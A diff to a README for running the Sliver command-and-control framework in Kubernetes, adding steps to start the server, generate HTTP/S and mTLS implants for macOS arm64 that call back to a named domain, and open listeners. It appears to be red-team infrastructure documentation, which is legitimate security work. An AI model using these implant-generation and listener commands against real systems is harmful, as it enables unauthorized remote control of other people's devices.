@@ -1,34 +1,46 @@
 # Sliver C2
 
-## Container Image Creation
+Sliver is a general-purpose cross-platform implant framework that supports C2
+over Mutual-TLS (mTLS), HTTP(S), and DNS.
 
-Begin by cloning the sliver repo locally:
+## Using Sliver C2 in Kubernetes
 
-```bash
-git clone https://github.com/BishopFox/sliver.git
-cd sliver
-```
+1. **Start the Sliver Server:**
 
-### Building and Pushing the Container Image to Github Container Registry
+   ```bash
+   kubectl exec -it deployments/sliver -- /opt/sliver-server
+   ```
 
-To push the container image to the `GitHub Container Registry` (`GHCR`), you
-will need to create a classic personal access token by following
-[these instructions](https://docs.github.com/en/packages/working-with-a-github-packages-registry/working-with-the-container-registry).
+1. **Create an Implant:**
 
-Once you have the token, assign the value to the `GITHUB_TOKEN` environment variable.
+   HTTP/S implant for macOS arm64 device:
 
-With that out of the way, you can build and push the container image to `GHCR`:
+   ```bash
+   generate --http sliver.techvomit.xyz --save /home/sliver/.sliver/implants/sliver-init --skip-symbols --os macos --arch arm64
+   ```
 
-```bash
-echo $GITHUB_TOKEN | docker login ghcr.io -u cowdogmoo --password-stdin
-docker buildx build --platform linux/amd64,linux/arm64,linux/arm/v7 -t ghcr.io/cowdogmoo/sliver:latest --push .
-```
+   mTLS implant for macOS arm64 device:
 
-### Testing the Container Image
+   ```bash
+   generate --mtls sliver.techvomit.xyz --save /home/sliver/.sliver/implants/sliver-mtls --skip-symbols --os macos --arch arm64
+   ```
 
-If everything worked, you should now be able to pull the new container image
-from `GHCR`:
+1. **Create a Listener:**
 
-```bash
-docker pull ghcr.io/cowdogmoo/sliver:latest
-```
+   HTTP listener:
+
+   ```bash
+   http
+   ```
+
+   HTTPS listener:
+
+   ```bash
+   https
+   ```
+
+   mTLS listener:
+
+   ```bash
+   mtls
+   ```
